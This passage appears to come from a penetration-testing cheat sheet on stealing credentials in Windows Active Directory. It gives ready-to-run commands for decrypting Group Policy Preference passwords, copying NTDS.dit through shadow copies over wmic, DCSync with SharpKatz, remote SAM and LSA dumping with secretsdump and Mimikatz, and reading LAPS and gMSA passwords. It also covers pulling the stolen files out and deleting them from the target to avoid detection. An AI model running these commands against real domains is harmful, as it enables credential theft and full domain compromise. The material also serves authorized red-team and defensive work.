- 1\. Search for interesting files like \.xml Group Policy Preference \(GPP\) files in the DC SYSVOL share: `get-childitem \\<DC name>\SYSVOL\<FQDN>\Policies -include *.xml -Recurse`
- 2\. Analyse the returned xml files \(specially Groups\.xml\) for user information and encrypted passwords
- 3\. \(optional\) GPP passwords are of type “cpassword” and can be decrypted to plaintext \([gpp\-decrypt](https://github.com/t0thkr1s/gpp-decrypt)\): `python3 gpp-decrypt.py -f <groups.xml>`

##### _NTDS dump via shadow copy:_ 
Instead of dumping the NTDS\.dit file remotely via secretsdump with the likelyhood of being detected, use this technique that focusses on using shadow copies and dumping hashes locally\. 
>This method requires elevated privileges on the target DC\. Furthermore, any remote exection method can be used to run the commands \(in this example wmic is used\)\. 
- 1\. Check for excisting shadow copies: `wmic /node:"<computer>" /user:"<domain>\<username>" /password:"<password>" process call create "cmd /c vssadmin list shadows >> c:\users\public\documents\log.txt"`
- 2\. If not present, create new shadow copy: `wmic /node:"<DC name>" /user:"<domain>\<username>" /password:"<password>" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"`
- 3\. From the shadow copy, copy the ntds\.dit, system and security files: `wmic /node:"<DC name>" /user:"<domain>\<username>" /password:"<password>" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\users\public\documents\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\users\public\documents\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\users\public\documents\"`
- 4\. \(optional\) pack and encrypt shadow files:
	- 1\. Upload the 7za\.exe standalone binary to the current system\. 
	- 2\. Remotely archive the copied files into a \.zip file: `7za.exe a -tzip -mx5 \\DC01\C$\users\public\docs.zip \\DC01\C$\users\public\documents -pPassword123`
- 5\. Download the docs\.zip file or all the individual files to the local attacker system and delete the ntds\.dit, system, security and docs\.zip files on the target system
- 6\. Locally extract all the hashes \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL`

##### _Remote secrets dumping:_
- DCSync: 
	- Dump hash of single account \([SharpKatz.exe](https://github.com/b4rtik/SharpKatz)\): SharpKatz --Command dcsync --User <username> --Domain <FQDN> --DomainController <FQDN DC>`
	- Extract all hashes and store them in a file \(can also be used with alternative user creds for authentication\) (SharpKatz): `SharpKatz --Command dcsync --Domain userdomain --DomainController dc (--AuthUser <username> --AuthDomain <domain> --AuthPassword <password>)`
- Remote SAM \+ LSA Secrets dumping:
	- Dump hashes like secretsdump \([SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump)\): `SharpSecDump -target=<target ip> -u=<username> -p=<password> -d=<domain>`
	- [Invoke\-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1): `Invoke-Mimikatz -Computername <target system name> -Command "<mimikatz command>"`
- Dump SAM/LSA/NTDS\.dit/etc\. \(if possible its recommended to use a DC account for this\) \([impacket](https://github.com/SecureAuthCorp/impacket)\): `secretsdump.py "<domain name>/<username>@<IP target>" (-hashes <NTLM>)`

##### _Abusing Local Administrator Password Management Solution \(LAPS\):_
LAPS provides rules for managing passwords for local administrator across computers in the domain\. If a Administrator user password is expired, a new random password is generated and set up and stored in AD as an attribute\. These attributes can be read \(in clear text\) by users with the right privileges \(e\.g\. DA’s\)\.
>It is required to have some sort of read privilege on the target system’s LAPS attribute\. 
- 1\. To idenfity if LAPS is applied to a machine, check if the “ms\-Mcs\-AdmPwdExpirationTime” attribute is not null \(can also be done with BloodHound\) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname`
- 2\. Check for which local account the LAPS password applies \(this is not always the local Administrator account\)\. If you already on a system with LAPS enabled, check the local users with admin privs or remotely list them\. 
- 3\. Retrieve the password from “ms\-Mcs\-AdmPwd” attributes \(make sure you are in the right context to read the “ms\-Mcs\-AdmPwn” property\):
	- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `Lapsdump <ip or hostname>`
	- \([SharpLAPS](https://github.com/swisskyrepo/SharpLAPS)\) (CS only): `execute-assembly SharpLAPS.exe /host:<IP DC> (/user:<domain>\<user> /pass:<password>)`
	- \([SharpView](https://github.com/tevora-threat/SharpView)\): `Get-DomainObject -Identity <target machine name> -Properties ms-Mcs-AdmPwd`
	- \([CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)\): `crackmapexec smb <target ip> -u <username> -H <NTLM> -M laps`
- 4\. Authenticate locally \(\.\\admin\) to the target system with the associated LAPS account and specify the returned LAPS password\. 

##### _Stored Group Policy Registry Preference Passwords:_
- Retrieves password from Autologon entries that are pushed through Group Policy Registry Preferences \([Get\-GPPAutologon\.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1)\): `Get-GPPAutologon`
- Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences \(use '\-Server' for remote retrieval\) \([Get\-GPPPassword\.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)\): `Get-GPPPassword (-Server <FQDN target system>)`

##### _Attacking AD Group Managed Service Accounts \(gMTA\):_
In Active Directory, Group Managed Service Accounts \(gMSA's\) have their passwords stored in a LDAP property called msDS\-ManagedPassword which automatically get resets by the DC’s every 30 days\. These passwords are retrievable by authorized administrators and by the servers who they are installed on\. msDS\-ManagedPassword is an encrypted data blob called MSDS\-MANAGEDPASSWORD\_BLOB and it’s only retrievable when the connection is secured\. It is a common vulnerability that gMSA have more privileges than they should have and sometimes other AD groups can read the msDS\-ManagedPassword property\.
>To successfully exploit this vulnerability, it is mandatory to either coerce a NTLM authentication request over HTTP from a privileged system or have control over an account with high enough privileges to read the msDS\-ManagedPassword property\.
- 1\. Dump gMSA passwords: 
	- Extract GMSA NT hash \([GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)\): `GMSAPasswordReader.exe --accountname <target GMSA account>`
	- Dump the gMSA password blobs and parse the value to a NTLM hash \(the user must have enough privileges to do this\) \([gMSADumper](https://github.com/micahvandeusen/gMSADumper)\): `python3 gMSADumper.py -u <usename> -p <password or NTLM hash> -d <FQDN> -l <FQDN target DC>`
- 2\. Use the compromised NTLM hashes \(if enough privileges\) or exploit available Unconstrained or Constrained delegation rights\. 



